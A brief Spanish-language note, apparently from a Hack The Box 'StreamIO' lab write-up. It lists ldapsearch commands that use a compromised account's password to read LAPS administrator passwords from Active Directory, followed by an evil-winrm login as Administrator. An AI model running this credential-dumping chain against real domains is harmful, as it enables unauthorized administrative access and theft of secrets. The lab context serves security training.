
### DESDE FUERA DE LA MÁQUINA
```shell
#CONTEXTO TODO VIENE DEL ARCHIVO WRITE OWNER POR GRUPOS.

ldapsearch -x -h 10.10.11.158 -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' -b "dc=streamio,dc=htb" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd

ldapsearch -x -H ldap://10.10.11.158 -D JDgodd@streamio.htb -w 'JDg0dd1s@d0p3cr3@t0r' -b "dc=streamio,dc=htb" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
evil-winrm -i 10.10.11.158 -u 'Administrator' -p 'pi30o64alO-+xY' #En mi caso
```